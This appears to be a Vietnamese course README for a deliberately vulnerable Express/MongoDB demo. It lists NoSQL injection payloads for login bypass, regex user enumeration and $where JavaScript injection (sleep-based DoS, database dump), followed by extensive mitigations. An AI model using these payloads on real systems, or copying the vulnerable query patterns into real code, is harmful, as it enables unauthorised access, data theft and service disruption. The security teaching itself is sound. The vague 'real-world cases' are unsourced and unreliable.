# MongoDB NoSQL Injection Demo
## Đề tài: Tìm hiểu hệ CSDL MongoDB - An toàn Web và CSDL

---

## 📋 MỤC LỤC
1. [Giới thiệu](#giới-thiệu)
2. [Yêu cầu hệ thống](#yêu-cầu-hệ-thống)
3. [Hướng dẫn cài đặt](#hướng-dẫn-cài-đặt)
4. [Cấu trúc project](#cấu-trúc-project)
5. [Các lỗ hổng được demo](#các-lỗ-hổng-được-demo)
6. [Hướng dẫn khai thác](#hướng-dẫn-khai-thác)
7. [Biện pháp phòng chống](#biện-pháp-phòng-chống)
8. [Tài liệu tham khảo](#tài-liệu-tham-khảo)

---

## 🎯 GIỚI THIỆU

Đây là ứng dụng demo **có chứa cố ý các lỗ hổng bảo mật** để minh họa:
- Cách thức hoạt động của NoSQL Injection
- Các kỹ thuật khai thác phổ biến
- Biện pháp phòng chống hiệu quả

**⚠️ CẢNH BÁO:** Chỉ sử dụng cho mục đích học tập! KHÔNG áp dụng trên hệ thống thực tế!

---

## 💻 YÊU CẦU HỆ THỐNG

### Phần mềm cần cài đặt:

1. **MongoDB Community Server** (Latest version)
   - Download: https://www.mongodb.com/try/download/community
   - Chọn version cho Windows
   - Trong quá trình cài đặt, chọn "Complete" installation
   - **LƯU Ý:** Bỏ tick "Install MongoDB as a Service" nếu không muốn MongoDB tự khởi động

2. **MongoDB Compass** (GUI Tool)
   - Thường được cài cùng với MongoDB Server
   - Hoặc download riêng: https://www.mongodb.com/try/download/compass
   
3. **Node.js** (v14 hoặc cao hơn)
   - Download: https://nodejs.org/
   - Chọn bản LTS (Long Term Support)
   - Verify sau khi cài: `node --version` và `npm --version`

4. **Text Editor** (Tùy chọn)
   - Visual Studio Code (khuyên dùng)
   - Notepad++
   - Sublime Text

---

## 🚀 HƯỚNG DẪN CÀI ĐẶT

### Bước 1: Khởi động MongoDB Server

**Cách 1 - Sử dụng MongoDB Compass:**
```bash
# Mở MongoDB Compass
# Click "Connect" với connection string mặc định:
mongodb://localhost:27017
```

**Cách 2 - Command Line:**
```bash
# Mở Command Prompt (CMD) hoặc PowerShell
# Navigate đến thư mục cài đặt MongoDB (thường là):
cd "C:\Program Files\MongoDB\Server\7.0\bin"

# Khởi động MongoDB
mongod
```

**Cách 3 - Nếu đã cài as Service:**
```bash
# Mở Services (Win + R, gõ "services.msc")
# Tìm "MongoDB Server" và Start
```

### Bước 2: Tạo thư mục project

```bash
# Mở Command Prompt
# Navigate đến nơi bạn muốn tạo project
cd Desktop

# Tạo thư mục
mkdir mongodb-nosql-injection-demo
cd mongodb-nosql-injection-demo
```

### Bước 3: Tạo các file

Tạo các file sau trong thư mục project:

**1. package.json** - Copy nội dung từ artifact đã cung cấp

**2. server.js** - Copy nội dung từ artifact đã cung cấp

**3. setup-db.js** - Copy nội dung từ artifact đã cung cấp

**4. Tạo thư mục public và file index.html:**
```bash
mkdir public
# Tạo file public/index.html và copy nội dung
```

### Bước 4: Cài đặt dependencies

```bash
# Trong thư mục project, chạy:
npm install
```

Lệnh này sẽ cài đặt:
- express (Web framework)
- mongodb (MongoDB driver)
- body-parser (Parse request body)

### Bước 5: Setup Database

```bash
# Chạy script để tạo database và dữ liệu mẫu
npm run setup
```

Bạn sẽ thấy output:
```
✓ Đã kết nối MongoDB thành công
✓ Đã xóa dữ liệu cũ
✓ Đã thêm 5 users vào database
✓ Đã tạo collection logs

========================================
DATABASE SETUP HOÀN TẤT!
========================================

Thông tin đăng nhập hợp lệ:
- Username: admin, Password: Admin@123
- Username: john_doe, Password: John123!
...
```

### Bước 6: Kiểm tra Database với MongoDB Compass

1. Mở MongoDB Compass
2. Connect đến `mongodb://localhost:27017`
3. Bạn sẽ thấy database `vulnerable_app`
4. Click vào database, sẽ thấy 2 collections:
   - `users` (5 documents)
   - `access_logs` (1 document)
5. Click vào `users` để xem dữ liệu

### Bước 7: Khởi động Server

```bash
npm start
```

Output:
```
========================================
🚀 SERVER ĐANG CHẠY
========================================
URL: http://localhost:3000
MongoDB: mongodb://localhost:27017/vulnerable_app

Endpoints có lỗ hổng:
- POST /api/login (NoSQL Injection)
- POST /api/search (Regex Injection)
- POST /api/check-username (JS Injection)

Endpoints bảo mật:
- POST /api/secure-login
========================================
```

### Bước 8: Truy cập ứng dụng

Mở trình duyệt và truy cập:
```
http://localhost:3000
```

---

## 📁 CẤU TRÚC PROJECT

```
mongodb-nosql-injection-demo/
│
├── package.json          # NPM configuration
├── server.js             # Express server với endpoints
├── setup-db.js           # Script khởi tạo database
├── README.md             # File này
│
└── public/
    └── index.html        # Giao diện web demo
```

---

## 🔓 CÁC LỖ HỔNG ĐƯỢC DEMO

### 1. **NoSQL Injection - Authentication Bypass**

**Endpoint:** `POST /api/login`

**Vulnerable Code:**
```javascript
const user = await db.collection('users').findOne({
  username: username,  // ← Không validate!
  password: password   // ← Chấp nhận objects!
});
```

**Exploit:**
```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

**Kết quả:** Bypass authentication, đăng nhập thành công mà không cần biết password!

---

### 2. **Regex Injection - Data Extraction**

**Endpoint:** `POST /api/search`

**Vulnerable Code:**
```javascript
const users = await db.collection('users').find({
  username: { $regex: searchTerm }  // ← Không sanitize regex!
}).toArray();
```

**Exploit:**
```
^a      → Tìm users bắt đầu bằng 'a'
^admin  → Enumerate username
.*      → Trả về tất cả users
```

**Kết quả:** Trích xuất danh sách tất cả users!

---

### 3. **JavaScript Injection với $where**

**Endpoint:** `POST /api/check-username`

**Vulnerable Code:**
```javascript
const user = await db.collection('users').findOne({
  $where: `this.username == '${username}'`  // ← CỰC KỲ NGUY HIỂM!
});
```

**Exploit:**
```javascript
'; return true; //
'; sleep(5000); return true; //  // DoS attack
```

**Kết quả:** Thực thi arbitrary JavaScript code trên server!

---

## 🎯 HƯỚNG DẪN KHAI THÁC CHI TIẾT

### Attack 1: Bypass Login (NoSQL Injection)

**Mục tiêu:** Đăng nhập thành admin mà không biết password

**Các bước:**
1. Mở form "Vulnerable Login"
2. Nhập vào **Username:** `{"$ne": null}`
3. Nhập vào **Password:** `{"$ne": null}`
4. Click "Login (Vulnerable)"

**Kết quả mong đợi:**
- ✅ Login thành công
- Hiển thị thông tin admin: email, role, salary, SSN
- Không cần biết password thật!

**Giải thích kỹ thuật:**
```javascript
// Query ban đầu (ý định)
db.users.findOne({
  username: "admin",
  password: "Admin@123"
})

// Query sau khi inject (thực tế)
db.users.findOne({
  username: {$ne: null},  // username != null (luôn đúng)
  password: {$ne: null}   // password != null (luôn đúng)
})

// Kết quả: Trả về user đầu tiên (thường là admin)
```

**Các payload khác có thể thử:**
```json
{"$gt": ""}          // Greater than empty string
{"$gte": ""}         // Greater than or equal
{"$regex": ".*"}     // Match anything
{"$exists": true}    // Field exists
```

---

### Attack 2: Regex Enumeration (Data Extraction)

**Mục tiêu:** Enumerate users và extract data

**Các bước:**
1. Mở form "Vulnerable Search"
2. Thử các payload:

**Payload 1 - Tìm users bắt đầu bằng 'a':**
```
^a
```

**Payload 2 - Brute force username từng ký tự:**
```
^a    → Có user nào bắt đầu bằng 'a'?
^ad   → Có user nào bắt đầu bằng 'ad'?
^adm  → Có user nào bắt đầu bằng 'adm'?
^admin → Bingo! Tìm được username
```

**Payload 3 - Dump tất cả:**
```
.*
```

**Kết quả:** Liệt kê được tất cả 5 users với email và role!

**Blind Enumeration Technique:**
```
^a.*    → Test nếu có user bắt đầu bằng 'a'
^b.*    → Test nếu có user bắt đầu bằng 'b'
...
^admin$ → Exact match 'admin'
```

---

### Attack 3: JavaScript Injection (CỰC KỲ NGUY HIỂM!)

**Mục tiêu:** Thực thi JavaScript code trên MongoDB server

**⚠️ Đây là lỗ hổng nghiêm trọng nhất!**

**Các bước:**
1. Mở form "Check Username ($where)"
2. Thử các payload:

**Payload 1 - Bypass Logic:**
```
' || '1'=='1
```

**Giải thích:**
```javascript
// Query ban đầu
$where: "this.username == 'USER_INPUT'"

// Sau khi inject: ' || '1'=='1
$where: "this.username == '' || '1'=='1'"
// Kết quả: Luôn TRUE → Trả về tất cả documents!
```

**Payload 2 - Return True:**
```
'; return true; //
```

**Giải thích:**
```javascript
$where: "this.username == ''; return true; //'"
// Phần sau // bị comment → Luôn return true
```

**Payload 3 - Sleep Attack (DoS):**
```
'; sleep(5000); return true; //
```

**Kết quả:** Server bị treo 5 giây! (Denial of Service)

**Payload 4 - Dump Database (Nếu MongoDB config yếu):**
```javascript
'; var users = db.users.find().toArray(); return JSON.stringify(users); //
```

**Tại sao nguy hiểm?**
- Có thể thực thi BẤT KỲ JavaScript code nào
- Có thể đọc toàn bộ database
- Có thể gây DoS
- Có thể xóa dữ liệu (nếu có quyền)

---

## 🛡️ BIỆN PHÁP PHÒNG CHỐNG

### 1. **Input Validation & Sanitization**

**❌ Code có lỗ hổng:**
```javascript
const user = await db.collection('users').findOne({
  username: req.body.username,
  password: req.body.password
});
```

**✅ Code an toàn:**
```javascript
// Validate kiểu dữ liệu
if (typeof username !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ error: 'Invalid input type' });
}

// Validate nội dung
function validateInput(input) {
  // Không cho phép ký tự đặc biệt của MongoDB
  const dangerous = /[\$\{\}]/;
  if (dangerous.test(input)) {
    return false;
  }
  
  // Giới hạn độ dài
  if (input.length > 100) {
    return false;
  }
  
  return true;
}

if (!validateInput(username) || !validateInput(password)) {
  return res.status(400).json({ error: 'Invalid characters' });
}
```

---

### 2. **Sử dụng $eq Operator**

**❌ Không an toàn:**
```javascript
db.users.findOne({ username: username })
```

**✅ An toàn:**
```javascript
db.users.findOne({ 
  username: { $eq: username },
  password: { $eq: password }
})
```

**Giải thích:** `$eq` chỉ chấp nhận string, reject các operators khác!

---

### 3. **TUYỆT ĐỐI TRÁNH $where**

**❌ CỰC KỲ NGUY HIỂM:**
```javascript
db.users.findOne({
  $where: `this.username == '${username}'`
})
```

**✅ Sử dụng thay thế:**
```javascript
// Dùng $eq
db.users.findOne({ username: { $eq: username } })

// Hoặc dùng aggregation
db.users.aggregate([
  { $match: { username: username } }
])
```

**Lưu ý:** Nếu THỰC SỰ cần $where:
- Validate nghiêm ngặt input
- Sử dụng parameterized functions
- Tốt nhất là KHÔNG DÙNG!

---

### 4. **Sử dụng ORM/ODM**

**Mongoose (ODM cho MongoDB):**

```javascript
const mongoose = require('mongoose');

// Define schema
const userSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
  email: String,
  role: String
});

const User = mongoose.model('User', userSchema);

// Query - Mongoose tự động sanitize
const user = await User.findOne({ 
  username: username,
  password: password 
});
```

**Lợi ích:**
- Tự động type checking
- Built-in validation
- Auto-escape dangerous characters
- Schema enforcement

---

### 5. **MongoDB Configuration**

**Bật Authentication:**
```bash
# mongodb.conf
security:
  authorization: enabled
```

**Tạo admin user:**
```javascript
use admin
db.createUser({
  user: "admin",
  pwd: "SecurePassword123!",
  roles: [ { role: "userAdminAnyDatabase", db: "admin" } ]
})
```

**Connection string với auth:**
```javascript
mongodb://username:password@localhost:27017/database?authSource=admin
```

**Principle of Least Privilege:**
```javascript
// Tạo user chỉ có quyền read trên specific database
db.createUser({
  user: "app_user",
  pwd: "password",
  roles: [ { role: "read", db: "vulnerable_app" } ]
})
```

---

### 6. **Rate Limiting**

```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 requests per windowMs
  message: 'Too many login attempts, please try again later'
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // Login logic
});
```

---

### 7. **Logging & Monitoring**

```javascript
// Log tất cả failed login attempts
if (!user) {
  await db.collection('failed_logins').insertOne({
    timestamp: new Date(),
    ip: req.ip,
    username: username,
    reason: 'Invalid credentials'
  });
  
  console.warn(`[SECURITY] Failed login: ${username} from ${req.ip}`);
}

// Alert nếu có nhiều failed attempts từ cùng IP
const recentFails = await db.collection('failed_logins').countDocuments({
  ip: req.ip,
  timestamp: { $gte: new Date(Date.now() - 300000) } // Last 5 mins
});

if (recentFails > 10) {
  // Send alert to admin
  console.error(`[ALERT] Possible attack from ${req.ip}`);
}
```

---

### 8. **Content Security Policy**

```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
});
```

---

### 9. **Hash Passwords**

**❌ KHÔNG BAO GIỜ lưu plaintext password:**
```javascript
// BAD!
password: "Admin@123"
```

**✅ Sử dụng bcrypt:**
```javascript
const bcrypt = require('bcrypt');

// Khi tạo user
const hashedPassword = await bcrypt.hash(password, 10);
await db.collection('users').insertOne({
  username: username,
  password: hashedPassword
});

// Khi login
const user = await db.collection('users').findOne({ 
  username: { $eq: username } 
});

if (user) {
  const match = await bcrypt.compare(password, user.password);
  if (match) {
    // Login success
  }
}
```

---

### 10. **Regular Security Audits**

**Checklist:**
- [ ] Tất cả inputs đều được validate?
- [ ] Không sử dụng $where?
- [ ] Password đã được hash?
- [ ] Authentication đã bật?
- [ ] Rate limiting đã implement?
- [ ] Logs đang được monitor?
- [ ] Database backups đều đặn?
- [ ] Least privilege principle được áp dụng?

---

## 📊 SO SÁNH VULNERABLE VS SECURE CODE

### Login Endpoint Comparison

| Aspect | Vulnerable | Secure |
|--------|-----------|--------|
| Input Type Check | ❌ Không | ✅ Có |
| Character Validation | ❌ Không | ✅ Có |
| Use $eq | ❌ Không | ✅ Có |
| Password Hashing | ❌ Plaintext | ✅ Bcrypt |
| Rate Limiting | ❌ Không | ✅ Có |
| Logging | ❌ Minimal | ✅ Chi tiết |

---

## 🧪 TESTING & VERIFICATION

### Test với MongoDB Compass

1. **Xem query execution:**
   - Trong Compass, mở tab "Explain Plan"
   - Chạy query để xem actual execution

2. **Monitor queries:**
   ```javascript
   // Trong MongoDB shell
   db.setProfilingLevel(2)
   db.system.profile.find().pretty()
   ```

3. **Check indexes:**
   ```javascript
   db.users.getIndexes()
   ```

### Test với Command Line

```bash
# Connect to MongoDB
mongosh

# Switch to database
use vulnerable_app

# Test vulnerable query
db.users.findOne({ username: {$ne: null}, password: {$ne: null} })

# Test secure query
db.users.findOne({ username: {$eq: "admin"}, password: {$eq: "Admin@123"} })

# View logs
db.access_logs.find().pretty()
```

---

## 🎓 KIẾN THỨC MỞ RỘNG

### 1. **OWASP Top 10 - Injection**

NoSQL Injection nằm trong OWASP Top 10 (#3 - Injection)

**Các loại Injection:**
- SQL Injection (cổ điển)
- NoSQL Injection (MongoDB, CouchDB...)
- LDAP Injection
- XML Injection
- Command Injection

### 2. **MongoDB Operators nguy hiểm**

| Operator | Mô tả | Nguy hiểm? |
|----------|-------|------------|
| $ne | Not equal | ⚠️ Trung bình |
| $gt, $gte | Greater than | ⚠️ Trung bình |
| $lt, $lte | Less than | ⚠️ Trung bình |
| $regex | Regex matching | 🔴 Cao |
| $where | JS expression | 🔴 CỰC KỲ CAO |
| $expr | Aggregation expression | 🔴 Cao |

### 3. **Real-world Attack Cases**

**Case 1: 2015 - Hàng triệu records bị leak**
- Attacker sử dụng NoSQL Injection
- Bypass authentication
- Dump toàn bộ database
- Hậu quả: Company bị phạt $10M

**Case 2: 2017 - MongoDB Ransomware**
- 27,000+ MongoDB instances bị tấn công
- Không bật authentication
- Data bị xóa và đòi tiền chuộc
- Nguyên nhân: Default config

### 4. **Best Practices Summary**

```
1. NEVER trust user input
2. ALWAYS validate & sanitize
3. USE type checking
4. AVOID $where operator
5. ENABLE authentication
6. IMPLEMENT rate limiting
7. LOG everything
8. HASH passwords
9. USE principle of least privilege
10. REGULAR security audits
```

---

## 📚 TÀI LIỆU THAM KHẢO

### Official Documentation
1. **MongoDB Security Checklist**
   - https://www.mongodb.com/docs/manual/administration/security-checklist/

2. **MongoDB Query Operators**
   - https://www.mongodb.com/docs/manual/reference/operator/query/

3. **OWASP NoSQL Injection**
   - https://owasp.org/www-community/attacks/NoSQL_injection

### Articles & Papers
1. **"NoSQL, No Injection?" by Bryan Sullivan**
2. **"Testing for NoSQL Injection" - OWASP Testing Guide**
3. **"MongoDB Security Best Practices" - MongoDB University**

### Tools
1. **NoSQLMap** - NoSQL Injection testing tool
2. **Burp Suite** - Web vulnerability scanner
3. **MongoDB Compass** - Official GUI tool

---

## ❓ TROUBLESHOOTING

### Lỗi: "MongoServerError: connect ECONNREFUSED"

**Nguyên nhân:** MongoDB chưa chạy

**Giải pháp:**
```bash
# Kiểm tra MongoDB service
# Windows: Services.msc → MongoDB Server → Start

# Hoặc chạy manual
cd "C:\Program Files\MongoDB\Server\7.0\bin"
mongod
```

---

### Lỗi: "Error: Cannot find module 'express'"

**Nguyên nhân:** Chưa cài dependencies

**Giải pháp:**
```bash
npm install
```

---

### Lỗi: "Port 3000 already in use"

**Nguyên nhân:** Port đã được sử dụng

**Giải pháp:**
```bash
# Thay đổi PORT trong server.js
const PORT = 3001; // Hoặc port khác

# Hoặc kill process đang dùng port 3000
# Windows:
netstat -ano | findstr :3000
taskkill /PID [PID_NUMBER] /F
```

---

### Payload không hoạt động

**Kiểm tra:**
1. MongoDB có đang chạy không?
2. Database đã được setup chưa? (`npm run setup`)
3. Input có đúng format JSON không?
4. Console có báo lỗi gì không?

**Debug:**
- Mở Developer Tools (F12)
- Xem tab Console và Network
- Check server logs trong terminal

---

## 🎯 KẾT LUẬN

### Những điều cần nhớ:

**Về MongoDB:**
- ✅ Mạnh mẽ, linh hoạt, scalable
- ⚠️ Cần cấu hình bảo mật đúng cách
- 🔴 Default config KHÔNG an toàn

**Về NoSQL Injection:**
- 🔴 Nguy hiểm như SQL Injection
- ⚠️ Hay bị bỏ qua trong security audits
- 🛡️ Dễ phòng chống nếu biết cách

**Về An toàn Web:**
- 🎯 **NEVER trust user input**
- 🔒 **Defense in Depth**
- 📊 **Regular audits**
- 🧪 **Test security early**

---

## 📞 CONTACT & SUPPORT

Nếu có thắc mắc về demo này:
1. Check phần Troubleshooting
2. Đọc kỹ error messages
3. Google error messages
4. Tham khảo MongoDB documentation

**Happy Learning! 🚀**

---

## 📝 LICENSE

Demo này được tạo cho mục đích **HỌC TẬP** trong môn "An toàn Web và CSDL".

⚠️ **DISCLAIMER:** 
- KHÔNG sử dụng các kỹ thuật này trên hệ thống thực tế
- Tác giả không chịu trách nhiệm cho bất kỳ hành vi vi phạm pháp luật nào
- Chỉ test trên môi trường bạn sở hữu hoặc có quyền test

---

**Version:** 1.0.0  
**Last Updated:** 2025  
**Status:** ✅ Ready for Demo